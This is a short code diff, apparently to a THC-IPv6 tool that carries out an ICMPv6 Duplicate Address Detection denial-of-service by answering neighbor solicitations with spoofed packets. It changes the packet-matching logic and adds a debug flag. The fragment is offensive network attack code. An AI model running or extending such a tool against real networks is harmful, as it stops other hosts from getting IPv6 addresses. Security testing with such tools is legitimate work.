@@ -10,7 +10,7 @@
 #include <pcap.h>
 #include "thc-ipv6.h"
 
-unsigned char *pkt = NULL, *dstmac, *dst;
+unsigned char *pkt = NULL, *dstmac, *dst, matchfoo[16];
 int pkt_len = 0;
 thc_ipv6_hdr *ipv6;
 int mychecksum;
@@ -43,8 +43,7 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
   }
   if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_NEIGHBORSOL || header->caplen < 78)
     return;
-  if (*(ipv6hdr + 8) + *(ipv6hdr + 9) + *(ipv6hdr + 10) + *(ipv6hdr + 11) + *(ipv6hdr + 12) + *(ipv6hdr + 13) + *(ipv6hdr + 14) + *(ipv6hdr + 15) != 0
-      && (ipv6hdr[8] != 0 && ipv6hdr[8] == ipv6hdr[48]))
+  if (memcmp(matchfoo, ipv6hdr + 8, 16) != 0 && !(ipv6hdr[8] == 0xfe && ipv6hdr[48] != 0xfe))
     return;
   if (debug)
     printf("DEBUG: packet is a valid duplicate ip6 check via icmp6 neighbor solitication\n");
@@ -83,6 +82,12 @@ int main(int argc, char *argv[]) {
   char dummy[24];
   unsigned char *ownmac;
 
+  if (argc == 3 && strncmp(argv[1], "-d", 2) == 0) {
+    argv++;
+    argc--;
+    debug = 1;
+  }
+
   if (argc != 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
@@ -112,6 +117,7 @@ int main(int argc, char *argv[]) {
     thc_dump_data(ipv6->pkt, ipv6->pkt_len, "Prepared spoofing packet");
     printf("\n");
   }
+  memset(matchfoo, 0, sizeof(matchfoo));
 
   printf("Started ICMP6 DAD Denial-of-Service (Press Control-C to end) ...\n");
   return thc_pcap_function(interface, "icmp6", (char *) intercept, 1, NULL);
